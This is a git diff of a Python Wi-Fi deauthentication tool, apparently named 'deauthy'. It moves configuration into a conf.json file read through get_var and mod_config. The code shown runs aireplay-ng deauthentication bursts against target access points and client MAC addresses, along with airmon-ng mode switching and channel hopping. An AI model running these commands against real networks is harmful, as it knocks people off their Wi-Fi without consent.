@@ -2,6 +2,7 @@ from socket import if_nameindex
 from deauthy.deauthy_types import Interface, BSSID, ESSID, MAC
 from subprocess import DEVNULL, STDOUT, check_call, check_output, CalledProcessError
 import sys
+import json
 import threading
 import time
 
@@ -45,6 +46,7 @@ class Functs:
         Accepts either "monitor" or "managed"
         """
         from deauthy.terminal import Terminal
+        from deauthy.functs import mod_config
         from halo import Halo
         end = Terminal.End
         def managed():
@@ -52,6 +54,7 @@ class Functs:
                 out = check_call(["airmon-ng", "stop", f"{card.name}"], stdout=DEVNULL, stderr=STDOUT)
                 if out != 1:
                     spinner.succeed(f"{card.name} is now in {mode} mode")
+                     
                 else:
                     spinner.fail(f"Could not put {card.name} in {mode} mode{end}")
         def monitor():
@@ -73,37 +76,37 @@ class Functs:
             raise RuntimeError("That's not a valid interface mode.")
 
     def do_bssid_method(bssid: BSSID):
-        from deauthy.storage import current_wiface
+        from deauthy.functs import get_var
         Functs.BSSID_METHOD.deauth(bssid)
         try:
             Functs.do_bssid_method(bssid)
         except KeyboardInterrupt:
-            Functs.switch(card=Interface(current_wiface), mode="managed")
+            Functs.switch(card=Interface(get_var('interface')), mode="managed")
             return
 
     class ChannelSys:
         def hopper(channel_number: int):
-            from deauthy.storage import current_wiface
             """Hop to a different channel"""
-            out = check_call(["airmon-ng", "start", f"{current_wiface}", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)
+            out = check_call(["airmon-ng", "start", f"{get_var('interface')}", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)
 
     class BSSID_METHOD:
-        def deauth(bssid: str):
+        def deauth(bssid: BSSID):
             """"""
-            from deauthy.storage import current_wiface, target_mac
 
             for key, value in bssid.bssids.items():
                 Functs.ChannelSys.hopper(value)
                 try:
-                    out = check_call(["aireplay-ng", "-0", "5", "-a", key, "-c", target_mac, current_wiface], stdout=DEVNULL, stderr=STDOUT)
+                    out = check_call(["aireplay-ng", "-0", "5", "-a", key, "-c", get_var('target_mac'), get_var('interface')], stdout=DEVNULL, stderr=STDOUT)
                 except KeyboardInterrupt:
-                    Functs.switch(Interface(current_wiface), "managed")
+                    Functs.switch(Interface(get_var('interface')), "managed")
                     return
 
     class ESSID_METHOD:
         def deauth(eSSID: ESSID):
             """"""
-            from deauthy.storage import current_wiface, target_mac
+            from deauthy.functs import get_var
+            current_wiface  = get_var('interface')
+            target_mac      = get_var('target_mac')
             channel = eSSID.channel
             Functs.ChannelSys.hopper(channel)
             try:
@@ -112,33 +115,22 @@ class Functs:
                 Functs.switch(Interface(current_wiface), "managed")
                 return
 
-class Spinner:
-    busy = False
-    delay = 0.1
+def mod_config(key: str, value):
+    with open("conf.json", "r") as jsonfile:
+        data = json.load(jsonfile)
+        jsonfile.close()
+        
+    data[key] = value
+    with open("conf.json", "w") as jsonfile:
+        myJSON = json.dump(data, jsonfile)
+        jsonfile.close()
 
-    @staticmethod
-    def spinning_cursor():
-        while 1: 
-            for cursor in '|/-\\': yield cursor
-
-    def __init__(self, delay=None):
-        self.spinner_generator = self.spinning_cursor()
-        if delay and float(delay): self.delay = delay
-
-    def spinner_task(self):
-        while self.busy:
-            sys.stdout.write(next(self.spinner_generator))
-            sys.stdout.flush()
-            time.sleep(self.delay)
-            sys.stdout.write('\b')
-            sys.stdout.flush()
-
-    def __enter__(self):
-        self.busy = True
-        threading.Thread(target=self.spinner_task).start()
-
-    def __exit__(self, exception, value, tb):
-        self.busy = False
-        time.sleep(self.delay)
-        if exception is not None:
-            return False
+def get_var(key: str):
+    with open("conf.json", "r") as jsonfile:
+        data = json.load(jsonfile)
+        jsonfile.close()
+        try:
+            val = data[key]
+            return val
+        except KeyError:
+            return None
